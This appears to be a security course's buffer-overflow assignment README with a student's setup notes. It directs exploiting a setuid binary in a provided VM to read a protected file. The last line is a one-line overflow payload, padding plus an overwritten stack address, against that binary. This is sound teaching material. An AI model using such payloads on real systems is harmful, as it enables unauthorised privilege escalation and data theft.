Mini-project 6
============

**Due: Nov. 20, 2020 by 11:59 PM US Central Time**.

You are asked to exploit a buffer overflow vulnerability to steal some information.

# Instructions:
* Install a virtual machine manager like VirtualBox
* Import the CS4352_MP6.ova file into your VirtualBox
* Start CS4352_MP6
* Log into the system
  * Username: abc
  * Password: edf
  * Of course, you may use “ssh -p 8822 abc@127.0.0.1”
* Find out what the contents of the file **note** are

# Evaluation:
- **50 points**: If you can pull it off, briefly describe what you did in a pdf file.

# Hints: 
* Note that the executable a.out is compiled out of the source.c under the same directory. 
* a.out is a setuid program.
* Well, I will stop here since I don’t want to deprive the fun of hacking by giving you guys too many hints. Good luck! 

## Personal Notes
I'm on an Arch Linux system, and using a Linux-lts kernel. I had to install lts-headers, and the virtualbox-host-dkms package due to my kernel.
I was getting issues in starting up, so had to go to intel bios settings and enable intel virtualization. Which made it work.

./a.out `perl -e 'print "A"x12'``printf "\xed\xfe\xff\xbf"`
